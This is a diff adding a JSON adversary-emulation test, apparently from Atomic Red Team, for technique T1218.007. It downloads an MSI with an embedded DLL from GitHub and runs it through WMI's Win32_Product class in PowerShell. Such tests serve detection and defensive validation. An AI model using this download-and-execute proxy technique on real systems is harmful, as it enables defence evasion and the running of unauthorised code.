@@ -1,0 +1,92 @@
+{
+  "id": "32eb3861-30da-4993-897a-42737152f5f8",
+  "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded DLL",
+  "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "19b02784-6d71-4279-b408-3eb69b851b7b",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "993ab303-844e-4b86-9c9a-b6dd8d1b2ff6",
+      "name": "Check dependency 1/1",
+      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a9cb72e5-cdfe-4375-8ca3-2c685efd20a8",
+      "name": "Resolve dependency 1/1",
+      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "2afe5965-7a22-4e70-9ca1-255d756f161e",
+      "name": "Re-check dependency 1/1",
+      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "993ab303-844e-4b86-9c9a-b6dd8d1b2ff6",
+      "p": "on-success",
+      "o": "19b02784-6d71-4279-b408-3eb69b851b7b"
+    },
+    {
+      "s": "993ab303-844e-4b86-9c9a-b6dd8d1b2ff6",
+      "p": "on-failure",
+      "o": "a9cb72e5-cdfe-4375-8ca3-2c685efd20a8"
+    },
+    {
+      "s": "a9cb72e5-cdfe-4375-8ca3-2c685efd20a8",
+      "p": "on-success",
+      "o": "2afe5965-7a22-4e70-9ca1-255d756f161e"
+    },
+    {
+      "s": "2afe5965-7a22-4e70-9ca1-255d756f161e",
+      "p": "on-failure",
+      "o": "19b02784-6d71-4279-b408-3eb69b851b7b"
+    }
+  ],
+  "tags": [
+    "T1218.007",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "msi_payload",
+      "type": "path",
+      "description": "MSI file to execute",
+      "value": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
+    },
+    {
+      "name": "action",
+      "type": "string",
+      "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
+      "value": "Install"
+    }
+  ]
+}
